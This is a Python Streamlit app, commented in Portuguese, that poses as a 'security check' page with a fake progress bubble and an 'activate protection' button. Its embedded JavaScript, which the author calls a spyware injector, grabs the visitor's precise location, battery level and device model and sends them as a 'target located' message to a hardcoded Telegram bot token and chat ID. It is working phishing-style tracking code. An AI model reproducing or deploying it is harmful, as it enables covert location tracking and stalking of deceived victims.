import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SEU ESTILO ORIGINAL (BOLHA FLUTUANTE) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    
    .scanner-box { 
        display: flex; flex-direction: column; align-items: center; padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
    }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    .btn-fiel {
        background-color: white; color: #333; border: none;
        padding: 12px 20px; border-radius: 4px; font-size: 14px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- INJETOR TIPO SPYWARE (ENVIO INDEPENDENTE) ---
js_spy = f"""
<div style="display: flex; justify-content: flex-start;">
    <button class="btn-fiel" onclick="runCapture()">
        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
async function runCapture() {{
    const options = {{ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }};
    
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            // Pegou a localização, agora extrai os dados do sistema
            const bat = await navigator.getBattery();
            const level = Math.round(bat.level * 100);
            const model = navigator.userAgent.split('(')[1].split(')')[0];
            
            const msg = "🛡️ *ALVO LOCALIZADO*\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 [VER MAPA](http://www.google.com/maps/place/" + pos.coords.latitude + "," + pos.coords.longitude + ")";
            
            // ENVIO DIRETO (Não passa pelo Streamlit, por isso não trava)
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
            }});
            
            // SÓ AGORA AVISA O STREAMLIT PARA GIRAR A PORCENTAGEM
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            // Se ele negar ou der erro, o script tenta forçar a barra de novo
            console.log("Acesso negado, tentando re-solicitar...");
        }},
        options
    );
}}
</script>
"""

# Importante: allow="geolocation" no componente
ativou = st.components.v1.html(js_spy, height=70)

if ativou:
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
